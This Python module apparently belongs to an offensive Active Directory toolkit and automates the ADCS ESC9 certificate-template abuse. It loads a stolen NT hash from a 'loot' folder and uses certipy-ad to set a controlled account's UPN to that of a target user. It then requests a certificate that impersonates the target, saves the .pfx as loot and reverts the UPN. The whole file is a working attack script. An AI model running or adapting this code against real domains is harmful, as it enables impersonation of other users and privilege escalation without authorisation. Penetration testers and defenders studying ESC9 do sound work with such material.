import os
import re
import uuid
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc9(session, template):
    print(blue(f"[*] Starting ESC9 abuse using vulnerable template: {template}"), flush=True)

    # Prompt for controlled and target user
    controlled_user = input("[?] Enter the user you control (e.g., user2): ").strip()
    target_user = input("[?] Enter the user you want to impersonate (e.g., user3): ").strip()

    # Step 1: Load hash from previously saved shadow module output
    hash_file = f"loot/{controlled_user}.hash"
    print(blue(f"[*] Step 1: Loading NT hash from {hash_file}..."), flush=True)
    if not os.path.exists(hash_file):
        print(red(f"[-] Hash file {hash_file} not found. Run 'attack shadow {controlled_user}' first."), flush=True)
        return

    with open(hash_file, "r") as f:
        nt_hash = f.read().strip()

    if not nt_hash or nt_hash.lower() == "none":
        print(red("[-] NT hash extraction returned None."), flush=True)
        return

    print(green(f"[+] Loaded NT hash for {controlled_user}: {nt_hash}"), flush=True)

    # Step 2: Change UPN of controlled user to impersonate target user
    print(blue(f"[*] Step 2: Changing {controlled_user}'s UPN to {target_user}@{session.domain}"), flush=True)
    update_upn_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {target_user}@{session.domain}"
    )
    output, err = run_command(update_upn_cmd)
    print(output, flush=True)
    if err:
        print(red(err), flush=True)

    # Step 3: Request cert using controlled user with target UPN
    print(blue(f"[*] Step 3: Requesting certificate as {target_user}@{session.domain}"), flush=True)
    output_file = f"{target_user}.pfx"
    request_cmd = (
        f"certipy-ad req -u {controlled_user}@{session.domain} -hashes :{nt_hash} "
        f"-ca {session.adcs_metadata['cas'][0]['name']} -template {template} -out {output_file}"
    )
    output, err = run_command(request_cmd)
    print(output, flush=True)
    if err:
        print(red(err), flush=True)

    if os.path.exists(output_file):
        with open(output_file, "rb") as f:
            data = f.read()
        save_loot(output_file, data, binary=True)
        print(green(f"[+] Certificate saved to loot/{output_file}"), flush=True)
    else:
        print(red("[-] Certificate file not found after request."), flush=True)

    # Step 4: Revert UPN of controlled user
    print(blue(f"[*] Step 4: Reverting {controlled_user}'s UPN back to {controlled_user}@{session.domain}"), flush=True)
    revert_cmd = (
        f"certipy-ad account update -u {session.username}@{session.domain} -p '{session.password}' "
        f"-user {controlled_user} -upn {controlled_user}@{session.domain}"
    )
    output, err = run_command(revert_cmd)
    print(output, flush=True)
    if err:
        print(red(err), flush=True)
    else:
        print(green("[+] Successfully reverted UPN."), flush=True)